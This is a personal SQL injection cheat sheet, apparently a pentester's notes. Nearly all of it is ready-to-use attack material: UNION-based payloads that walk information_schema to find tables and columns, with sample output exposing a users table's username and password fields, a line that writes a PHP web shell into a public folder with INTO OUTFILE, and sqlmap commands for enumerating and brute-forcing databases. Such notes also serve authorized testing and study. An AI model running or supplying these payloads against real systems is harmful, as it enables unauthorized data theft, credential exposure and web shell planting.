# sql injection

## External stuff

[exploit-db](https://www.exploit-db.com/papers/13045/) [ASCII table](https://github.com/justin-p/sec-stuff/blob/master/general%20info/ascii-table.md)

### Always True

1=1 a=a

### Escape/stop

#### mysql 

```sql
# 
-- 
#--
```

### MySQL Verison

select version\(\)

### information Schema

#### Table names

```sql
SELECT table_schema,table_name FROM information_Schema.tables

SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables

SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.tables
```

#### Injection example 1

```sql
' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 ORDER BY table_name LIMIT 0,1) #--
```

```text
dummymalex:dummyms
table_schema = dummymalex
table_name   = dummyms
```

#### Hide stuff we dont need

```sql
AND table_schema != 'information_schema'
```

#### Injection example 2

```sql
' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 AND table_schema != 'information_schema' ORDER BY table_name LIMIT 0,1) #--
```

```text
LIMIT 0,1
dummymalex:dummyms 
table_schema = dummymalex
table_name   = dummyms 

LIMIT 1,1 
dummymalex:users     
table_schema = dummymalex
table_name   = users
```

#### column\_name

```sql
SELECT column_schema,column_name FROM information_Schema.columns
```

#### Injection Example 1

```sql
' union (select CONCAT(column_name) from information_Schema.columns where table_name='dummyms' LIMIT 0,1) #--
```

```text
LIMIT 0,1
ID

LIMIT 1,1
dummyms

LIMIT 2,1
description
```

#### Injection Example 2

```sql
' union (select CONCAT(column_name) from information_Schema.columns where table_name='users' LIMIT 0,1) #--
```

```text
LIMIT 0,1
ID

LIMIT 1,1
username

LIMIT 2,1
password
```

### upload shell with INTO OUTFILE

```sql
select 'SHELLCODE' INTO OUTFILE '/path/to/public/folder/shell.php';
```

## SQLmap

### Simple usage

```
sqlmap -u "http://target_server/"
```

### Set target DBMS to MySQL
```
sqlmap -u "http://target_server/" --dbms=mysql
```

### Use POST requests

```
sqlmap -u "http://target_server/" --data=param1=value1&param2=value2
```

### Use POST request file

```
sqlmap -r request.txt -p [param-to-test]
```

### Batch run

```
sqlmap -r request.txt -p [param-to-test] --Batch
```

### Set Risk/Level

```
sqlmap -r request.txt -p psw --level=5 --risk=3 --dbms mysql --batch
```

### enumerate databases

```
sqlmap -r request.txt --batch --dbs
``` 

### enumerate tables

``` 
sqlmap -r request.txt -batch --tables
``` 

### brute-force tables

```
sqlmap -r request.txt -batch --common-tables
```

### brute-force columns

```
sqlmap -r request.txt -batch -T users --common-column
```